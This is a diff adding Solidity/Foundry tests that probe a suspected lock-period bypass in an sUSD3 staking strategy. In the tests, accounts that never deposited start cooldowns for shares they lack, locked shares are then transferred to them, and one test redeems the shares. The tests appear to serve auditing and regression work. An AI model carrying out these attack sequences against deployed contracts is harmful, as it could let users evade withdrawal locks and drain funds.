@@ -561,4 +561,271 @@ contract BypassAttempts is Setup {
         uint256 shares = usd3Strategy.deposit(10e6, alice); // Below minimum but should work
         assertGt(shares, 0, "Subsequent deposits should allow any amount");
     }
+
+    // ============ CRITICAL VULNERABILITY TESTS ============
+    // Tests for the lock period bypass vulnerability via transfer and pre-cooldown
+
+    function test_exploit_lock_bypass_via_transfer_and_precooldown() public {
+        console2.log("\n=== Testing Lock Period Bypass Vulnerability ===");
+
+        // Step 1: User1 (alice) deposits and gets locked shares
+        vm.startPrank(alice);
+        asset.approve(address(usd3Strategy), 1000e6);
+        usd3Strategy.deposit(1000e6, alice);
+        skip(7 days); // Pass USD3 commitment period
+
+        // Alice deposits into sUSD3 and gets locked
+        IERC20(address(usd3Strategy)).approve(address(susd3Strategy), 150e6);
+        susd3Strategy.deposit(150e6, alice);
+        uint256 aliceShares = IERC20(address(susd3Strategy)).balanceOf(alice);
+        uint256 aliceLockEnd = susd3Strategy.lockedUntil(alice);
+        vm.stopPrank();
+
+        console2.log("Alice deposited and got locked until:", aliceLockEnd);
+        console2.log("Alice sUSD3 shares:", aliceShares);
+        console2.log("Current timestamp:", block.timestamp);
+        assertGt(aliceLockEnd, block.timestamp, "Alice should be locked");
+
+        // Step 2: User2 (bob) who NEVER deposited starts cooldown
+        // This should succeed because lockedUntil[bob] == 0
+        console2.log(
+            "\nBob (who never deposited) attempts to start cooldown..."
+        );
+        vm.prank(bob);
+        susd3Strategy.startCooldown(type(uint256).max); // Max shares they don't even have
+
+        (
+            uint256 bobCooldownEnd,
+            uint256 bobWindowEnd,
+            uint256 bobCooldownShares
+        ) = susd3Strategy.getCooldownStatus(bob);
+        console2.log("Bob's cooldown started successfully!");
+        console2.log("Bob's cooldown end:", bobCooldownEnd);
+        console2.log("Bob's cooldown shares:", bobCooldownShares);
+        assertGt(bobCooldownEnd, 0, "Bob should have active cooldown");
+
+        // Step 3: Wait for Bob's cooldown to complete (but Alice still locked)
+        skip(7 days + 1); // Cooldown period
+        console2.log("\nAfter cooldown period:");
+        console2.log("Current timestamp:", block.timestamp);
+        console2.log("Alice still locked until:", aliceLockEnd);
+        assertLt(block.timestamp, aliceLockEnd, "Alice should still be locked");
+
+        // Step 4: Alice transfers her locked shares to Bob
+        console2.log("\nAlice attempts to transfer locked shares to Bob...");
+        vm.prank(alice);
+        vm.expectRevert("sUSD3: Cannot transfer during lock period");
+        IERC20(address(susd3Strategy)).transfer(bob, aliceShares);
+
+        // The vulnerability would be if Alice could transfer during lock
+        // and Bob could withdraw using pre-started cooldown
+        console2.log("Transfer correctly blocked during lock period");
+
+        // Step 5: Demonstrate what would happen if transfer was allowed
+        // Skip to after lock period to show the complete attack
+        skip(90 days);
+        console2.log("\n=== Demonstrating Complete Attack Scenario ===");
+        console2.log("After lock period - showing what attacker intended:");
+
+        // Now Alice can transfer
+        vm.prank(alice);
+        IERC20(address(susd3Strategy)).transfer(bob, aliceShares);
+        console2.log("Alice transferred shares to Bob");
+
+        // Bob would need to restart cooldown after receiving shares
+        // because the cooldown shares exceed his balance
+        uint256 bobBalance = IERC20(address(susd3Strategy)).balanceOf(bob);
+        console2.log("Bob's sUSD3 balance:", bobBalance);
+
+        // Check if Bob can withdraw with his pre-started cooldown
+        uint256 bobWithdrawLimit = susd3Strategy.availableWithdrawLimit(bob);
+        console2.log("Bob's withdraw limit:", bobWithdrawLimit);
+
+        // The issue is that Bob's cooldown was for max shares but he only has aliceShares
+        // The contract should validate cooldown shares against actual balance
+        if (bobWithdrawLimit > 0) {
+            console2.log(
+                "VULNERABILITY: Bob can withdraw with pre-started cooldown!"
+            );
+        } else {
+            console2.log(
+                "Bob cannot withdraw (cooldown shares mismatch or window expired)"
+            );
+        }
+    }
+
+    function test_non_depositor_can_start_cooldown() public {
+        console2.log("\n=== Testing Non-Depositor Cooldown Start ===");
+
+        // Charlie has never interacted with sUSD3
+        assertEq(
+            susd3Strategy.lockedUntil(charlie),
+            0,
+            "Charlie should have no lock"
+        );
+        assertEq(
+            IERC20(address(susd3Strategy)).balanceOf(charlie),
+            0,
+            "Charlie has no shares"
+        );
+
+        // Charlie can start cooldown because lockedUntil[charlie] == 0
+        // and block.timestamp >= 0 is always true
+        vm.prank(charlie);
+        susd3Strategy.startCooldown(1000e18); // Arbitrary large amount
+
+        (uint256 cooldownEnd, uint256 windowEnd, uint256 shares) = susd3Strategy
+            .getCooldownStatus(charlie);
+
+        console2.log("Charlie's cooldown end:", cooldownEnd);
+        console2.log("Charlie's cooldown shares:", shares);
+        assertGt(
+            cooldownEnd,
+            0,
+            "Charlie started cooldown without depositing!"
+        );
+        assertEq(
+            shares,
+            1000e18,
+            "Charlie set cooldown for shares they don't have!"
+        );
+    }
+
+    function test_transfer_locked_shares_bypass_attempt() public {
+        console2.log("\n=== Testing Transfer of Locked Shares ===");
+
+        // Setup: Alice deposits and gets locked
+        vm.startPrank(alice);
+        asset.approve(address(usd3Strategy), 1000e6);
+        usd3Strategy.deposit(1000e6, alice);
+        skip(7 days); // Pass USD3 commitment
+
+        IERC20(address(usd3Strategy)).approve(address(susd3Strategy), 150e6);
+        susd3Strategy.deposit(150e6, alice);
+        uint256 aliceShares = IERC20(address(susd3Strategy)).balanceOf(alice);
+        vm.stopPrank();
+
+        // Bob starts cooldown before receiving any shares
+        vm.prank(bob);
+        susd3Strategy.startCooldown(aliceShares); // Cooldown for exact amount Alice has
+
+        // Wait for cooldown
+        skip(7 days + 1);
+
+        // Alice tries to transfer during lock period
+        vm.prank(alice);
+        vm.expectRevert("sUSD3: Cannot transfer during lock period");
+        IERC20(address(susd3Strategy)).transfer(bob, aliceShares);
+
+        console2.log("Transfer during lock period correctly blocked");
+
+        // After lock period
+        skip(90 days);
+
+        // Alice can now transfer
+        vm.prank(alice);
+        IERC20(address(susd3Strategy)).transfer(bob, aliceShares);
+
+        // Check if Bob can immediately withdraw
+        uint256 bobWithdrawLimit = susd3Strategy.availableWithdrawLimit(bob);
+        console2.log(
+            "Bob's withdraw limit after receiving shares:",
+            bobWithdrawLimit
+        );
+
+        // Bob's pre-started cooldown should allow withdrawal if within window
+        (uint256 cooldownEnd, uint256 windowEnd, ) = susd3Strategy
+            .getCooldownStatus(bob);
+        if (block.timestamp >= cooldownEnd && block.timestamp <= windowEnd) {
+            // Within withdrawal window
+            assertGt(bobWithdrawLimit, 0, "Bob should be able to withdraw");
+            console2.log("ISSUE: Bob can withdraw using pre-started cooldown");
+
+            // Perform the withdrawal
+            vm.startPrank(bob);
+            IERC20(address(susd3Strategy)).approve(
+                address(susd3Strategy),
+                aliceShares
+            );
+            uint256 withdrawn = susd3Strategy.redeem(aliceShares, bob, bob);
+            console2.log("Bob successfully withdrew:", withdrawn);
+            vm.stopPrank();
+        }
+    }
+
+    function test_cooldown_shares_exceed_balance_check() public {
+        console2.log("\n=== Testing Cooldown Shares vs Balance Validation ===");
+
+        // Bob starts cooldown for shares he doesn't have
+        vm.prank(bob);
+        susd3Strategy.startCooldown(1000e18);
+
+        (, , uint256 cooldownShares) = susd3Strategy.getCooldownStatus(bob);
+        uint256 bobBalance = IERC20(address(susd3Strategy)).balanceOf(bob);
+
+        console2.log("Bob's cooldown shares:", cooldownShares);
+        console2.log("Bob's actual balance:", bobBalance);
+        assertGt(
+            cooldownShares,
+            bobBalance,
+            "Cooldown shares exceed actual balance!"
+        );
+
+        // Wait for cooldown
+        skip(7 days + 1);
+
+        // Check withdraw limit when cooldown shares > balance
+        uint256 withdrawLimit = susd3Strategy.availableWithdrawLimit(bob);
+        console2.log(
+            "Bob's withdraw limit with mismatched shares:",
+            withdrawLimit
+        );
+
+        // The contract converts cooldown.shares to assets without checking balance
+        // This is a vulnerability if not properly validated during withdrawal
+    }
+
+    function test_multiple_users_exploit_scenario() public {
+        console2.log("\n=== Testing Multi-User Exploit Scenario ===");
+
+        // Alice deposits and gets locked
+        vm.startPrank(alice);
+        asset.approve(address(usd3Strategy), 1000e6);
+        usd3Strategy.deposit(1000e6, alice);
+        skip(7 days);
+        IERC20(address(usd3Strategy)).approve(address(susd3Strategy), 150e6);
+        susd3Strategy.deposit(150e6, alice);
+        vm.stopPrank();
+
+        // Multiple attackers (bob and charlie) start cooldowns
+        vm.prank(bob);
+        susd3Strategy.startCooldown(75e6);
+
+        vm.prank(charlie);
+        susd3Strategy.startCooldown(75e6);
+
+        // Wait for cooldowns
+        skip(7 days + 1);
+
+        // After lock period, Alice splits shares between attackers
+        skip(90 days);
+
+        vm.startPrank(alice);
+        IERC20(address(susd3Strategy)).transfer(bob, 75e6);
+        IERC20(address(susd3Strategy)).transfer(charlie, 75e6);
+        vm.stopPrank();
+
+        // Both can withdraw immediately
+        uint256 bobLimit = susd3Strategy.availableWithdrawLimit(bob);
+        uint256 charlieLimit = susd3Strategy.availableWithdrawLimit(charlie);
+
+        console2.log("Bob's withdraw limit:", bobLimit);
+        console2.log("Charlie's withdraw limit:", charlieLimit);
+
+        if (bobLimit > 0 && charlieLimit > 0) {
+            console2.log(
+                "VULNERABILITY: Multiple attackers can bypass lock period!"
+            );
+        }
+    }
 }
